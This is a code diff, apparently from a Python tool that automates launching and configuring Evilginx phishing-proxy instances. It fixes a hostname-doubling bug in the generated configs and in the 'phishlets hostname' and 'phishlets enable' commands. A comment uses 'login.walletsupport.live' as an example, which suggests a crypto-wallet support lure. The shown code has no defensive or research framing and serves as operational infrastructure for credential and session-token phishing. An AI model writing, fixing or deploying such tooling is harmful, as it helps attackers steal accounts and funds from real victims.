@@ -158,18 +158,23 @@ class EvilginxProc:
 def write_config(config_dir: Path, base_domain: str, phishlet_hostname: str, phishlet_name: str,
                  bind_ipv4: str, external_ipv4: str, https_port: int,
                  autocert: bool = True, dns_port: int | None = None) -> Path:
+    # evilginx auto-prefixes the phishlet's is_landing hostname (e.g. "login")
+    # to the config domain. Use only the root domain here to avoid doubling
+    # (e.g. login.login.walletsupport.live).
+    parts = base_domain.split(".")
+    root_domain = ".".join(parts[-2:]) if len(parts) >= 3 else base_domain
     cfg = {
         "general": {
             "autocert": autocert,
             "bind_ipv4": bind_ipv4,
-            "domain": base_domain,
+            "domain": root_domain,
             "external_ipv4": external_ipv4,
             "https_port": https_port,
             "unauth_url": "https://www.google.com",
         },
         "phishlets": {
             phishlet_name: {
-                "hostname": phishlet_hostname,
+                "hostname": root_domain,
                 "enabled": False,
             }
         },
@@ -296,10 +301,14 @@ class InstanceManager:
         self._copy_phishlets(config_dir, phishlet_name)
         add_loopback(loopback_ip, f"evg{uuid.uuid4().hex[:6]}", apply=self.settings.loopback_apply)
 
+        # evilginx auto-prefixes the phishlet's landing hostname; use root domain only
+        parts = base_domain.split(".")
+        root_domain = ".".join(parts[-2:]) if len(parts) >= 3 else base_domain
+
         proc = self._spawn(config_dir, phishlet_hostname, log_dir)
 
         try:
-            resp = proc.send(f"phishlets hostname {phishlet_name} {phishlet_hostname}")
+            resp = proc.send(f"phishlets hostname {phishlet_name} {root_domain}")
             logger.info("phishlets hostname output: %s", resp[-300:])
             time.sleep(1)
             resp = proc.send(f"phishlets enable {phishlet_name}")
